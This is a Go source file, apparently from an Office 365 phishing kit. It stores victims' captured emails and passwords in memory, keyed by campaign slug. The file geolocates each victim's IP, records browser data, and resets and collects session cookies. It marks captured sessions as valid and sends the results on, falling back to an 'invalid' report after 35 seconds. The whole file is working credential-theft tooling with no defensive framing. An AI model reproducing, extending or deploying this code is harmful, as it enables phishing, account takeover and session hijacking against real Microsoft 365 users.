// capture/cred.go  – DISK-FREE FULL REWRITE
package capture

import (
	"strings"
	"sync"
	"time"

	"o365/configdb"
	"o365/utils"
)

/* ───────── data model ───────── */

type CredentialEntry struct {
	Slug         string            `json:"slug"`
	Email        string            `json:"email"`
	Password     string            `json:"password"`
	AuthMethod   string            `json:"auth_method"`
	Timestamp    time.Time         `json:"ts"`
	ValidSession bool              `json:"valid_session"`
	Raw          map[string]string `json:"raw,omitempty"`
	Geo          *utils.GeoInfo    `json:"geo,omitempty"`
	BrowserAgent string            `json:"browser,omitempty"`
	BrowserTime  string            `json:"local_time,omitempty"`
}

/* ───────── in-memory store ───────── */

var (
	credMu    sync.Mutex
	credStore = map[string]*CredentialEntry{} // key = slug|email
)

func key(slug, email string) string { return slug + "|" + email }

/* ───────── SaveCreds ───────── */

func SaveCreds(payload map[string]string, ip string) {
	slug := strings.TrimSpace(payload["slug"])
	email := strings.TrimSpace(payload["login"])
	pass := strings.TrimSpace(payload["passwd"])
	auth := strings.TrimSpace(payload["auth_method"])
	valid := strings.ToLower(payload["valid_session"]) == "true"

	if slug == "" || email == "" {
		return
	}

	credMu.Lock()
	ce, ok := credStore[key(slug, email)]
	if !ok {
		ce = &CredentialEntry{Slug: slug, Email: email, Raw: map[string]string{}}
		credStore[key(slug, email)] = ce
	}
	credMu.Unlock()

	/* fresh attempt? wipe old cookies so new session collects clean */
	if pass != "" {
		memMu.Lock()                          // memMu / cstore from save_cookie.go
		delete(cstore, storeKey(slug, email)) // flush old cookie map
		memMu.Unlock()
	}

	/* update fields */
	ce.Timestamp = time.Now().UTC()
	ce.ValidSession = valid
	ce.Raw = payload
	if pass != "" {
		ce.Password = pass
	}
	if auth != "" {
		ce.AuthMethod = auth
	}
	if geo, err := utils.GeoLookup(ip); err == nil {
		ce.Geo = geo
	}

	lastSeenEmail[slug] = email
	configdb.IncLog(slug)

	/* immediate dispatch (valid may wait for cookies) */
	maybeSendResult(slug, email)

	/* schedule INVALID fallback after 35 s */
	if pass != "" {
		captured := ce.Timestamp
		go func(s, e string, t time.Time) {
			time.Sleep(35 * time.Second)
			maybeSendInvalid(s, e, t)
		}(slug, email, captured)
	}
}

/* ───────── update helpers ───────── */

func SetAuthMethodFor(slug, email, method string) {
	if slug == "" || email == "" || method == "" {
		return
	}
	credMu.Lock()
	defer credMu.Unlock()
	if ce, ok := credStore[key(slug, email)]; ok {
		ce.AuthMethod = method
	}
}

func SetSessionValidFor(slug, email string) {
	if slug == "" || email == "" {
		return
	}
	credMu.Lock()
	if ce, ok := credStore[key(slug, email)]; ok {
		ce.ValidSession = true
	}
	credMu.Unlock()
	maybeSendResult(slug, email)
	configdb.IncValid(slug)
}

// Back-compat legacy path
func SetSessionValid(email string) {
	for slug, e := range lastSeenEmail {
		if e == email {
			SetSessionValidFor(slug, email)
			return
		}
	}
}

func SaveBrowserMetadataFor(slug, email, ua, t string) {
	credMu.Lock()
	if ce, ok := credStore[key(slug, email)]; ok {
		ce.BrowserAgent = ua
		ce.BrowserTime = t
	}
	credMu.Unlock()
}

// Back-compat
func SaveBrowserMetadata(email, ua, t string) {
	for slug, e := range lastSeenEmail {
		if e == email {
			SaveBrowserMetadataFor(slug, email, ua, t)
			return
		}
	}
}

/* ───────── accessors for result_builder ───────── */

func getCredEntry(slug, email string) *CredentialEntry {
	credMu.Lock()
	defer credMu.Unlock()
	return credStore[key(slug, email)]
}

func markCredSent(slug, email, status string) {
	credMu.Lock()
	if ce, ok := credStore[key(slug, email)]; ok {
		if ce.Raw == nil {
			ce.Raw = map[string]string{}
		}
		ce.Raw["__sent"] = status
	}
	credMu.Unlock()
}

/* ───────── misc accessor used elsewhere ───────── */

func GetLastSeenEmail(slug string) string { return lastSeenEmail[slug] }

var lastSeenEmail = map[string]string{} // slug -> email
